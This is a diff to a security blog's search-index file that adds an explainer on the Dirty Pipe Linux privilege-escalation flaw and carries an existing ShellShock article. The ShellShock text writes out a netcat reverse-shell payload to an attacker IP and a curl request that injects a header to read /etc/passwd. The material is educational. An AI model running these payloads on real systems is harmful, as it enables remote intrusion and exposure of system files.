@@ -7,11 +7,14 @@ var relearn_search_index = [
     "uri": "/exploit-articles/index.html"
   },
   {
-    "content": "",
+    "content": " Vulnerability Affected OS CVE CVSS Score Disclosure Date Dirty Pipe Linux (kernel versions 5.8 and newer) CVE-2022-0847 7.8 (high) March 7 2022 This exploit was disclosed by Max Kellermann.\nDirtyPipe is a local privilege escalation vulnerability, which allows a user to bypass file permission restrictions and write arbitrary data to any file, provided certain conditions are met, the primary one being that the user has to have read permissions to the file.\nIn order to understand this vulnerability, we need to understand the following concepts:\npipe page splice() Pipe: A pipe is a communication method between two or more processes in which the output of one process can be used as the input for the other. An example of a pipe is ls -la | grep Documents. In this example, the output of the ls command (which is a listing of files and directories) is piped into the grep command which in turn, looks for the string Documents in that input and displays the results on screen. Pipes are unidirectional, with a read end and a write end.\nPage: Memory management in Linux makes use of pages. Whether it is to read from a file on the secondary memory (like the hard drive) or to write to it, pages are used. Memory pages are 4 KB in size. Whenever data is read from the secondary memory, it is put into the page cache. Likewise, when data is to be written to the disk, it is placed in the page cache and eventually written to the disk. This setup eliminates the need to expensive read-write operations to the disk. Since main memory is way faster than secondary memory, this scheme helps performance. One point that is of relevance when talking about this vulnerability is the PIPE_BUF_FLAG_CAN_MERGE flag, which indicates whether merging more data into the pipe is allowed or not.\nsplice(): is a system call (a system call is a way through which a process requests a service from the operating system) which moves data between a file descriptor and a pipe, without copying between kernel address space and user address space. The pipe doesn’t actually contain the data itself, but a reference to the location of the page cache in memory, where the data is stored.\nThe way this vulnerability is exploited is as follows:\nRead the target file. This will cause the file to be placed in the page cache. Create a pipe in a special way so that the PIPE_BUF_FLAG_CAN_MERGE is set. Use the splice() system call to make the pipe point to the locations of the page cache where the data is cached. Write arbitrary data into the pipe. The data so written will overwrite the cached page file and since the PIPE_BUF_FLAG_CAN_MERGE is set, it overwrites the file on the disk. Exploit code available on exploit-db.com\nThe blog post by Max Kellermann about this exploit linked here is a fascinating read.\n",
     "description": "",
-    "tags": null,
-    "title": "bash",
-    "uri": "/tags/bash/index.html"
+    "tags": [
+      "exploit",
+      "linux"
+    ],
+    "title": "Dirty Pipe",
+    "uri": "/exploit-articles/dirty-pipe/index.html"
   },
   {
     "content": "",
@@ -28,6 +31,20 @@ var relearn_search_index = [
     "uri": "/tags/linux/index.html"
   },
   {
+    "content": "",
+    "description": "",
+    "tags": null,
+    "title": "Tags",
+    "uri": "/tags/index.html"
+  },
+  {
+    "content": "",
+    "description": "",
+    "tags": null,
+    "title": "bash",
+    "uri": "/tags/bash/index.html"
+  },
+  {
     "content": " ShellShock is a vulnerability in the Bash shell (GNU Bash upto version 4.3) that allows Bash to execute unintentional commands from environment variables. Attackers can issue commands remotely on the target host with elevated privileges, resulting in complete takeover of the system.\nLet us have a look at what environment variables are.\nEnvironment variables are the variables specific to a certain environment, like a root user would have different environment variables than a normal user in a Linux system.\nThe env command prints out a list of all the environment variables for your login on to the screen. Some examples of environment variables are USER, HOME, SHELL, LANG etc. You can set an environment variable with export VARIABLE_NAME=variable_value. One point to note is that environment variables declared in this manner are valid only for the current bash session. In order to persist environment variables, you can define them in your .bashrc file. You could also print out specific env variables with the echo command, like echo $HOME.\nShellShock vulnerability is particularly dangerous due to the fact that a wide array of IoT smart devices like routers, webcams, home security systems etc. could potentially be targets to attacks. Applications like web and mail servers, DNS servers use bash to communicate with the underlying operating system, rendering them susceptible to attacks. ShellShock could also be used to launch DoS attacks on vulnerable servers.\nNow, for details on how this vulnerability affects systems.\nBash scripting language supports functions, that contain pieces of code that can be reused. We can also store the functions so defined, in environment variables, which would let bash scripts export functions as environment variables and allow a sub-shell to use them. Let us break it down a bit.\nYou can define bash functions with the syntax greeting=() { echo \"Hi dawns33ker\"; } The vulnerability arises from how bash implemented importing functions stored in environment variables. Whenever a new shell is created, bash looks through the environment variables for functions and imports all the defined functions. This is done by simply removing the = and evaluating the result.\nFor example, the greetings function above would become greeting() { echo \"Hi dawns33ker\"}; Due to ShellShock, it is possible to exploit this behaviour by adding extra code to the end of the function definition.\nLet us take the case of a function being defined as an environment variable. env X='() { :; }; echo \"bash vulnerable\"' bash -c :. This is a function which will determine if your version of bash is vulnerable to ShellShock. If vulnerable, the function will print the message bash vulnerable or else it prints nothing.\nThis function assignment consists of two commands. The first part is assigning the value X='() { :; }; echo \"bash vulnerable\"' to X. The value assigned to X is designed to exploit the ShellShock vulnerability, i.e chaining a command to the function definition, in this case the echo command. The second part i.e bash -c invokes a new bash shell with the command : which does nothing. That is to say that the first part of the payload () { :;}is a function that does nothing. The second part echo \"bash vulnerable\" which has been chained to the function definition is the malicious payload that will be executed when the function is imported.\nAs explained above, when the function is imported, the = is removed and the line X='() { :; }; echo \"bash vulnerable\" is passed to the bash interpreter. The ; is being a command separator, the definition of the X function and the malicious payload both are executed. The echo command would obviously be replaced by something more menacing, like spawning a reverse shell on the attacker PC, like, nc 10.10.11.1 4455 -e /bin/bash \u0026' bash -c :. This example works by using netcat to open a bash session and redirect input and output to the attacker’s machine. The \u0026 operator means that the session is opened in the background and now the attacker has a shell on the vulnerable system.\nShellShock can be exploited by using HTTP requests to a vulnerable server. An attacker could craft a request like () { :; }; echo \"PASSWD:\" $(\u003c/etc/passwd) and send the request to the server with curl -H \"User-Agent: () { :; }; echo \"PASSWD:\" $(\u003c/etc/passwd)\" http://example.com/\nReferences:\nGitHub\nCloudflare Blogs\nExploit Code:\nApache mod_cgi - ‘Shellshock’ Remote Command Injection\ndhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)\nBash - ‘Shellshock’ Environment Variables Command Injection\n",
     "description": "",
     "tags": [
@@ -37,13 +54,6 @@ var relearn_search_index = [
     ],
     "title": "ShellShock",
     "uri": "/exploit-articles/shellshock/index.html"
-  },
-  {
-    "content": "",
-    "description": "",
-    "tags": null,
-    "title": "Tags",
-    "uri": "/tags/index.html"
   },
   {
     "content": "",
